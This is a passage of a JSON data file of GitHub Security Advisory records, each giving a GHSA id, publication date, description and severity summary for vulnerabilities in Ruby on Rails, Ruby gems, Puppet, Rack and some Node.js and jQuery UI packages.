    "description": "In the yajl-ruby gem 1.3.0 for Ruby, when a crafted JSON file is supplied to Yajl::Parser.new.parse, the whole ruby process crashes with a SIGABRT in the yajl_string_decode function in yajl_encode.c. This results in the whole ruby process terminating and potentially a denial of service.",
    "summary": "High severity vulnerability that affects yajl-ruby"
  },
  {
    "ghsaId": "GHSA-rph7-j9qr-h8q8",
    "publishedAt": "2017-11-28T22:20:17Z",
    "description": "The codem-transcode module before 0.5.0 for Node.js, when ffprobe is enabled, allows remote attackers to execute arbitrary commands via a POST request to /probe.",
    "summary": "Moderate severity vulnerability that affects codem-transcode"
  },
  {
    "ghsaId": "GHSA-pjj4-w39g-pw54",
    "publishedAt": "2017-11-21T18:26:40Z",
    "description": "In the Ox gem 2.8.0 for Ruby, the process crashes with a segmentation fault when a crafted input is supplied to parse_obj. NOTE: the vendor has stated \"Ox should handle the error more gracefully\" but has not confirmed a security implication.",
    "summary": "Low severity vulnerability that affects ox"
  },
  {
    "ghsaId": "GHSA-q97v-764g-r2rp",
    "publishedAt": "2017-11-16T01:47:37Z",
    "description": "The gollum-grit_adapter Ruby gem dependency in gollum before 3.1.1 and the gollum-lib gem dependency in gollum-lib before 4.0.1 when the string \"master\" is in any of the wiki documents, allows remote authenticated users to execute arbitrary code via the -O or --open-files-in-pager flags.",
    "summary": "High severity vulnerability that affects gollum and gollum-lib"
  },
  {
    "ghsaId": "GHSA-7cv6-gvx3-m54m",
    "publishedAt": "2017-11-16T01:47:02Z",
    "description": "Cross-Site Scripting vulnerability in KeystoneJS before 4.0.0-beta.7 allows remote authenticated administrators to inject arbitrary web script or HTML via the \"content brief\" or \"content extended\" field, a different vulnerability than CVE-2017-15878.",
    "summary": "Moderate severity vulnerability that affects keystone"
  },
  {
    "ghsaId": "GHSA-6494-v9fq-fgq2",
    "publishedAt": "2017-11-16T01:46:50Z",
    "description": "CSV Injection (aka Excel Macro Injection or Formula Injection) exists in admin/server/api/download.js and lib/list/getCSVData.js in KeystoneJS before 4.0.0-beta.7 via a value that is mishandled in a CSV export.",
    "summary": "Moderate severity vulnerability that affects keystone"
  },
  {
    "ghsaId": "GHSA-mw35-24gh-f82w",
    "publishedAt": "2017-11-15T20:41:51Z",
    "description": "It was found that the Keycloak Node.js adapter 2.5 - 3.0 did not handle invalid tokens correctly.  An attacker could use this flaw to bypass authentication and gain access to restricted information, or to possibly conduct further attacks.",
    "summary": "High severity vulnerability that affects keycloak-connect and keycloak-js"
  },
  {
    "ghsaId": "GHSA-5v3f-73gv-x7x5",
    "publishedAt": "2017-11-15T20:41:14Z",
    "description": "Cairo version 1.15.4 is vulnerable to a NULL pointer dereference related to the FT_Load_Glyph and FT_Render_Glyph resulting in an application crash.",
    "summary": "Low severity vulnerability that affects cairo"
  },
  {
    "ghsaId": "GHSA-wmjf-jpjj-9f3j",
    "publishedAt": "2017-11-15T20:39:47Z",
    "description": "RuboCop 0.48.1 and earlier does not use /tmp in safe way, allowing local users to exploit this to tamper with cache files belonging to other users.",
    "summary": "Low severity vulnerability that affects rubocop"
  },
  {
    "ghsaId": "GHSA-7qcx-jmrc-h2rr",
    "publishedAt": "2017-11-15T19:44:16Z",
    "description": "A cross-site scripting (XSS) vulnerability exists in fields/types/markdown/MarkdownType.js in KeystoneJS before 4.0.0-beta.7 via the Contact Us feature.",
    "summary": "Cross-Site Scripting in keystone"
  },
  {
    "ghsaId": "GHSA-wwmf-6p58-6vj2",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The editing form in RWiki 2.1.0pre1 through 2.1.0 allows remote attackers to execute arbitrary Ruby code via unknown attack vectors.",
    "summary": "High severity vulnerability that affects rwiki"
  },
  {
    "ghsaId": "GHSA-rvpq-5xqx-pfpp",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Ruby on Rails before 1.1.5 allows remote attackers to execute Ruby code with \"severe\" or \"serious\" impact via a File Upload request with an HTTP header that modifies the LOAD_PATH variable, a different vulnerability than CVE-2006-4112.",
    "summary": "High severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-9wrq-xvmp-xjc8",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Unspecified vulnerability in the \"dependency resolution mechanism\" in Ruby on Rails 1.1.0 through 1.1.5 allows remote attackers to execute arbitrary Ruby code via a URL that is not properly handled in the routing code, which leads to a denial of service (application hang) or \"data loss,\" a different vulnerability than CVE-2006-4111.",
    "summary": "High severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-gm25-fpmr-43fj",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in the to_json (ActiveRecord::Base#to_json) function in Ruby on Rails before edge 9606 allows remote attackers to inject arbitrary web script via the input values.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-fjfg-q662-gm6j",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Rails before 1.2.4, as used for Ruby on Rails, allows remote attackers and ActiveResource servers to determine the existence of arbitrary files and read arbitrary XML files via the Hash.from_xml (Hash#from_xml) method, which uses XmlSimple (XML::Simple) unsafely, as demonstrated by reading passwords from the Pidgin (Gaim) .purple/accounts.xml file.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-jwhv-rgqc-fqj5",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Session fixation vulnerability in Rails before 1.2.4, as used for Ruby on Rails, allows remote attackers to hijack web sessions via unspecified vectors related to \"URL-based sessions.\"",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-p4c6-77gc-694x",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The session fixation protection mechanism in cgi_process.rb in Rails 1.2.4, as used in Ruby on Rails, removes the :cookie_only attribute from the DEFAULT_SESSION_OPTIONS constant, which effectively causes cookie_only to be applied only to the first instantiation of CgiRequest, which allows remote attackers to conduct session fixation attacks.  NOTE: this is due to an incomplete fix for CVE-2007-5380.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-xgj6-pgrm-x4r2",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Format string vulnerability in the mdiag_initialize function in gtk/src/rbgtkmessagedialog.c in Ruby-GNOME 2 (aka Ruby/Gnome2) 0.16.0, and SVN versions before 20071127, allows context-dependent attackers to execute arbitrary code via format string specifiers in the message parameter.",
    "summary": "Moderate severity vulnerability that affects gtk2"
  },
  {
    "ghsaId": "GHSA-xf96-32q2-9rw2",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Multiple SQL injection vulnerabilities in Ruby on Rails before 2.1.1 allow remote attackers to execute arbitrary SQL commands via the (1) :limit and (2) :offset parameters, related to ActiveRecord, ActiveSupport, ActiveResource, ActionPack, and ActionMailer.",
    "summary": "High severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-jmgf-p46x-982h",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "CRLF injection vulnerability in Ruby on Rails before 2.0.5 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via a crafted URL to the redirect_to function.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-8fqx-7pv4-3jwm",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Ruby on Rails 2.1 before 2.1.3 and 2.2.x before 2.2.2 does not verify tokens for requests with certain content types, which allows remote attackers to bypass cross-site request forgery (CSRF) protection for requests to applications that rely on this protection, as demonstrated using text/plain.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-rxq3-gm4p-5fj4",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The example code for the digest authentication functionality (http_authentication.rb) in Ruby on Rails before 2.3.3 defines an authenticate_or_request_with_http_digest block that returns nil instead of false when the user does not exist, which allows context-dependent attackers to bypass authentication for applications that are derived from this example by sending an invalid username without a password.",
    "summary": "High severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-8qrh-h9m2-5fvf",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in Ruby on Rails 2.x before 2.2.3, and 2.3.x before 2.3.4, allows remote attackers to inject arbitrary web script or HTML by placing malformed Unicode strings into a form helper.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-fg9w-g6m4-557j",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "A certain algorithm in Ruby on Rails 2.1.0 through 2.2.2, and 2.3.x before 2.3.4, leaks information about the complexity of message-digest signature verification in the cookie store, which might allow remote attackers to forge a digest via multiple attempts.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-j24p-r6wx-r79w",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "lib/thin/connection.rb in Thin web server before 1.2.4 relies on the X-Forwarded-For header to determine the IP address of the client, which allows remote attackers to spoof the IP address and hide activities via a modified X-Forwarded-For header.",
    "summary": "High severity vulnerability that affects thin"
  },
  {
    "ghsaId": "GHSA-9p3v-wf2w-v29c",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in the strip_tags function in Ruby on Rails before 2.2.s, and 2.3.x before 2.3.5, allows remote attackers to inject arbitrary web script or HTML via vectors involving non-printing ASCII characters, related to HTML::Tokenizer and actionpack/lib/action_controller/vendor/html-scanner/html/node.rb.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-6mq2-37j5-w6r6",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "WEBrick 1.3.1 in Ruby 1.8.6 through patchlevel 383, 1.8.7 through patchlevel 248, 1.8.8dev, 1.9.1 through patchlevel 376, and 1.9.2dev writes data to a log file without sanitizing non-printable characters, which might allow remote attackers to modify a window's title, or possibly execute arbitrary commands or overwrite files, via an HTTP request containing an escape sequence for a terminal emulator.",
    "summary": "Moderate severity vulnerability that affects webrick"
  },
  {
    "ghsaId": "GHSA-gjxw-5w2q-7grf",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Ruby on Rails 2.3.9 and 3.0.0 does not properly handle nested attributes, which allows remote attackers to modify arbitrary records by changing the names of parameters for form inputs.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-wcm2-9c89-wmfm",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in jquery.ui.dialog.js in the Dialog widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title option.",
    "summary": "Moderate severity vulnerability that affects jquery-ui"
  },
  {
    "ghsaId": "GHSA-75w6-p6mg-vh8j",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Multiple cross-site scripting (XSS) vulnerabilities in the mail_to helper in Ruby on Rails before 2.3.11, and 3.x before 3.0.4, when javascript encoding is used, allow remote attackers to inject arbitrary web script or HTML via a crafted (1) name or (2) email value.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-24fg-p96v-hxh8",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Ruby on Rails 2.1.x, 2.2.x, and 2.3.x before 2.3.11, and 3.x before 3.0.4, does not properly validate HTTP requests that contain an X-Requested-With header, which makes it easier for remote attackers to conduct cross-site request forgery (CSRF) attacks via forged (1) AJAX or (2) API requests that leverage \"combinations of browser plugins and HTTP redirects,\" a related issue to CVE-2011-0696.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-jmm9-2p29-vh2w",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Ruby on Rails 3.0.x before 3.0.4 does not ensure that arguments to the limit function specify integer values, which makes it easier for remote attackers to conduct SQL injection attacks via a non-numeric argument.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-4ww3-3rxj-8v6q",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "actionpack/lib/action_view/template/resolver.rb in Ruby on Rails 3.0.x before 3.0.4, when a case-insensitive filesystem is used, does not properly implement filters associated with the list of available templates, which allows remote attackers to bypass intended access restrictions via an action name that uses an unintended case for alphabetic characters.",
    "summary": "High severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-cpjc-p7fc-j9xh",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The deliver function in the sendmail delivery agent (lib/mail/network/delivery_methods/sendmail.rb) in Ruby Mail gem 2.2.14 and earlier allows remote attackers to execute arbitrary commands via shell metacharacters in an e-mail address.",
    "summary": "Moderate severity vulnerability that affects mail"
  },
  {
    "ghsaId": "GHSA-6x46-7rrv-m4h8",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The sqlite3-ruby gem in the rubygem-sqlite3 package before 1.2.4-0.5.1 in SUSE Linux Enterprise (SLE) 11 SP1 uses weak permissions for unspecified files, which allows local users to gain privileges via unknown vectors.",
    "summary": "Low severity vulnerability that affects sqlite3-ruby"
  },
  {
    "ghsaId": "GHSA-v9v4-7jp6-8c73",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The cross-site scripting (XSS) prevention feature in Ruby on Rails 2.x before 2.3.12, 3.0.x before 3.0.8, and 3.1.x before 3.1.0.rc2 does not properly handle mutation of safe buffers, which makes it easier for remote attackers to conduct XSS attacks via crafted strings to an application that uses a problematic string method, as demonstrated by the sub method.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-r7q2-5gqg-6c7q",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The template selection functionality in actionpack/lib/action_view/template/resolver.rb in Ruby on Rails 3.0.x before 3.0.10 and 3.1.x before 3.1.0.rc6 does not properly handle glob characters, which allows remote attackers to render arbitrary views via a crafted URL, related to a \"filter skipping vulnerability.\"",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-h6w6-xmqv-7q78",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Multiple SQL injection vulnerabilities in the quote_table_name method in the ActiveRecord adapters in activerecord/lib/active_record/connection_adapters/ in Ruby on Rails before 2.3.13, 3.0.x before 3.0.10, and 3.1.x before 3.1.0.rc5 allow remote attackers to execute arbitrary SQL commands via a crafted column name.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-v5jg-558j-q67c",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in the strip_tags helper in actionpack/lib/action_controller/vendor/html-scanner/html/node.rb in Ruby on Rails before 2.3.13, 3.0.x before 3.0.10, and 3.1.x before 3.1.0.rc5 allows remote attackers to inject arbitrary web script or HTML via a tag with an invalid name.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-9fh3-vh3h-q4g3",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in activesupport/lib/active_support/core_ext/string/output_safety.rb in Ruby on Rails 2.x before 2.3.13, 3.0.x before 3.0.10, and 3.1.x before 3.1.0.rc5 allows remote attackers to inject arbitrary web script or HTML via a malformed Unicode string, related to a \"UTF-8 escaping vulnerability.\"",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-fcqf-h4h4-695m",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "CRLF injection vulnerability in actionpack/lib/action_controller/response.rb in Ruby on Rails 2.3.x before 2.3.13 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via the Content-Type header.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-3vfw-7rcp-3xgm",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The to_s method in actionpack/lib/action_dispatch/middleware/remote_ip.rb in Ruby on Rails 3.0.5 does not validate the X-Forwarded-For header in requests from IP addresses on a Class C network, which might allow remote attackers to inject arbitrary text into log files or bypass intended address parsing via a crafted header.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-xxr8-833v-c7wc",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in the i18n translations helper method in Ruby on Rails 3.0.x before 3.0.11 and 3.1.x before 3.1.2, and the rails_xss plugin in Ruby on Rails 2.3.x, allows remote attackers to inject arbitrary web script or HTML via vectors related to a translations string whose name ends with an \"html\" substring.",
    "summary": "Moderate severity vulnerability that affects rails"
  },
  {
    "ghsaId": "GHSA-qv8p-v9qw-wc7g",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in Ruby on Rails 3.0.x before 3.0.12, 3.1.x before 3.1.4, and 3.2.x before 3.2.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving a SafeBuffer object that is manipulated through certain methods.",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-2xjj-5x6h-8vmf",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/form_options_helper.rb in the select helper in Ruby on Rails 3.0.x before 3.0.12, 3.1.x before 3.1.4, and 3.2.x before 3.2.2 allows remote attackers to inject arbitrary web script or HTML via vectors involving certain generation of OPTION elements within SELECT elements.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-c5qq-g673-5p49",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "telnet.rb in Puppet 2.7.x before 2.7.13 and Puppet Enterprise (PE) 1.2.x, 2.0.x, and 2.5.x before 2.5.1 allows local users to overwrite arbitrary files via a symlink attack on the NET::Telnet connection log (/tmp/out.log).",
    "summary": "Low severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-cj92-c4fj-w9c5",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "Directory traversal vulnerability in lib/mail/network/delivery_methods/file_delivery.rb in the Mail gem before 2.4.4 for Ruby allows remote attackers to read arbitrary files via a .. (dot dot) in the to parameter.",
    "summary": "Moderate severity vulnerability that affects mail"
  },
  {
    "ghsaId": "GHSA-rp63-jfmw-532w",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The Mail gem before 2.4.3 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a (1) sendmail or (2) exim delivery.",
    "summary": "High severity vulnerability that affects mail"
  },
  {
    "ghsaId": "GHSA-hgpp-pp89-4fgf",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain \"[nil]\" values, a related issue to CVE-2012-2694.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-fh39-v733-mxfr",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The Active Record component in Ruby on Rails 3.0.x before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage unintended recursion, a related issue to CVE-2012-2695.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-q34c-48gc-m9g8",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain \"['xyz', nil]\" values, a related issue to CVE-2012-2660.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-76wq-xw4h-f8wj",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The Active Record component in Ruby on Rails before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage improper handling of nested hashes, a related issue to CVE-2012-2661.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-vxf6-w9mp-95hm",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "lib/puppet/network/authstore.rb in Puppet before 2.7.18, and Puppet Enterprise before 2.5.2, supports use of IP addresses in certnames without warning of potential risks, which might allow remote attackers to spoof an agent by acquiring a previously used IP address.",
    "summary": "Low severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-92w9-2pqw-rhjj",
    "publishedAt": "2017-10-24T18:33:38Z",
    "description": "The decode_credentials method in actionpack/lib/action_controller/metal/http_authentication.rb in Ruby on Rails 3.x before 3.0.16, 3.1.x before 3.1.7, and 3.2.x before 3.2.7 converts Digest Authentication strings to symbols, which allows remote attackers to cause a denial of service by leveraging access to an application that uses a with_http_digest helper method, as demonstrated by the authenticate_or_request_with_http_digest method.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-98mf-8f57-64qf",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/form_tag_helper.rb in Ruby on Rails 3.x before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via the prompt field to the select_tag helper.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-h835-75hw-pj89",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in activesupport/lib/active_support/core_ext/string/output_safety.rb in Ruby on Rails before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 might allow remote attackers to inject arbitrary web script or HTML via vectors involving a ' (quote) character.",
    "summary": "Moderate severity vulnerability that affects activesupport"
  },
  {
    "ghsaId": "GHSA-7g65-ghrg-hpf5",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/sanitize_helper.rb in the strip_tags helper in Ruby on Rails before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via malformed HTML markup.",
    "summary": "Moderate severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-g89m-3wjw-h857",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Directory traversal vulnerability in lib/puppet/reports/store.rb in Puppet before 2.6.17 and 2.7.x before 2.7.18, and Puppet Enterprise before 2.5.2, when Delete is enabled in auth.conf, allows remote authenticated users to delete arbitrary files on the puppet master server via a .. (dot dot) in a node name.",
    "summary": "Low severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-8jxj-9r5f-w3m2",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/puppet/defaults.rb in Puppet 2.7.x before 2.7.18, and Puppet Enterprise before 2.5.2, uses 0644 permissions for last_run_report.yaml, which allows local users to obtain sensitive configuration information by leveraging access to the puppet master server to read this file.",
    "summary": "Low severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-q44r-f2hm-v76v",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/puppet/ssl/certificate_authority.rb in Puppet before 2.6.17 and 2.7.x before 2.7.18, and Puppet Enterprise before 2.5.2, does not properly restrict the characters in the Common Name field of a Certificate Signing Request (CSR), which makes it easier for user-assisted remote attackers to trick administrators into signing a crafted agent certificate via ANSI control sequences.",
    "summary": "Moderate severity vulnerability that affects puppet"
  },
  {
    "ghsaId": "GHSA-h77x-m5q8-c29h",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "lib/rack/multipart.rb in Rack before 1.1.4, 1.2.x before 1.2.6, 1.3.x before 1.3.7, and 1.4.x before 1.4.2 uses an incorrect regular expression, which allows remote attackers to cause a denial of service (infinite loop) via a crafted Content-Disposion header.",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-fgmx-8h93-26fh",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site request forgery (CSRF) vulnerability in the omniauth-oauth2 gem 1.1.1 and earlier for Ruby allows remote attackers to hijack the authentication of users for requests that modify session state.",
    "summary": "Moderate severity vulnerability that affects omniauth-oauth2"
  },
  {
    "ghsaId": "GHSA-gh2w-j7cx-2664",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "SQL injection vulnerability in the Active Record component in Ruby on Rails before 3.0.18, 3.1.x before 3.1.9, and 3.2.x before 3.2.10 allows remote attackers to execute arbitrary SQL commands via a crafted request that leverages incorrect behavior of dynamic finders in applications that can use unexpected data types in certain find_by_ method calls.",
    "summary": "High severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-qqxp-xp9v-vvx6",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in the default content option in jquery.ui.tooltip.js in the Tooltip widget in jQuery UI before 1.10.0 allows remote attackers to inject arbitrary web script or HTML via the title attribute, which is not properly handled in the autocomplete combo box demo.",
    "summary": "Moderate severity vulnerability that affects jquery-ui"
  },
  {
    "ghsaId": "GHSA-r23g-3qw4-gfh2",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Cross-site scripting (XSS) vulnerability in the RedCloth library 4.2.9 for Ruby and earlier allows remote attackers to inject arbitrary web script or HTML via a javascript: URI.",
    "summary": "Moderate severity vulnerability that affects redcloth"
  },
  {
    "ghsaId": "GHSA-gppp-5xc5-wfpx",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Ruby on Rails 3.0.x before 3.0.19, 3.1.x before 3.1.10, and 3.2.x before 3.2.11 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request, as demonstrated by certain \"[nil]\" values, a related issue to CVE-2012-2660 and CVE-2012-2694.",
    "summary": "Moderate severity vulnerability that affects activerecord"
  },
  {
    "ghsaId": "GHSA-jmgw-6vjg-jjwg",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "active_support/core_ext/hash/conversions.rb in Ruby on Rails before 2.3.15, 3.0.x before 3.0.19, 3.1.x before 3.1.10, and 3.2.x before 3.2.11 does not properly restrict casts of string values, which allows remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) involving nested XML entity references, by leveraging Action Pack support for (1) YAML type conversion or (2) Symbol type conversion.",
    "summary": "High severity vulnerability that affects actionpack"
  },
  {
    "ghsaId": "GHSA-pchc-949f-53m5",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "multi_xml gem 0.5.2 for Ruby, as used in Grape before 0.2.6 and possibly other products, does not properly restrict casts of string values, which allows remote attackers to conduct object-injection attacks and execute arbitrary code, or cause a denial of service (memory and CPU consumption) involving nested XML entity references, by leveraging support for (1) YAML type conversion or (2) Symbol type conversion, a similar vulnerability to CVE-2013-0156.",
    "summary": "High severity vulnerability that affects multi_xml"
  },
  {
    "ghsaId": "GHSA-3pxh-h8hw-mj8w",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "multipart/parser.rb in Rack 1.3.x before 1.3.8 and 1.4.x before 1.4.3 allows remote attackers to cause a denial of service (memory consumption and out-of-memory error) via a long string in a Multipart HTTP packet.",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-jxhw-mg8m-2pj8",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "Devise gem 2.2.x before 2.2.3, 2.1.x before 2.1.3, 2.0.x before 2.0.5, and 1.5.x before 1.5.4 for Ruby, when using certain databases, does not properly perform type conversion when performing database queries, which might allow remote attackers to cause incorrect results to be returned and bypass security checks via unknown vectors, as demonstrated by resetting passwords of arbitrary accounts.",
    "summary": "Moderate severity vulnerability that affects devise"
  },
  {
    "ghsaId": "GHSA-v2r9-c84j-v7xm",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "darkfish.js in RDoc 2.3.0 through 3.12 and 4.x before 4.0.0.preview2.1, as used in Ruby, does not properly generate documents, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a crafted URL.",
    "summary": "Moderate severity vulnerability that affects rdoc"
  },
  {
    "ghsaId": "GHSA-85r7-w5mv-c849",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "rack/file.rb (Rack::File) in Rack 1.5.x before 1.5.2 and 1.4.x before 1.4.5 allows attackers to access arbitrary files outside the intended root directory via a crafted PATH_INFO environment variable, probably a directory traversal vulnerability that is remotely exploitable, aka \"symlink path traversals.\"",
    "summary": "Moderate severity vulnerability that affects rack"
  },
  {
    "ghsaId": "GHSA-x457-cw4h-hq5f",
    "publishedAt": "2017-10-24T18:33:37Z",
    "description": "The JSON gem before 1.5.5, 1.6.x before 1.6.8, and 1.7.x before 1.7.7 for Ruby allows remote attackers to cause a denial of service (resource consumption) or bypass the mass assignment protection mechanism via a crafted JSON document that triggers the creation of arbitrary Ruby symbols or certain internal objects, as demonstrated by conducting a SQL injection attack against Ruby on Rails, aka \"Unsafe Object Creation Vulnerability.\"",
    "summary": "High severity vulnerability that affects json"
  },
  {
    "ghsaId": "GHSA-gr44-7grc-37vq",
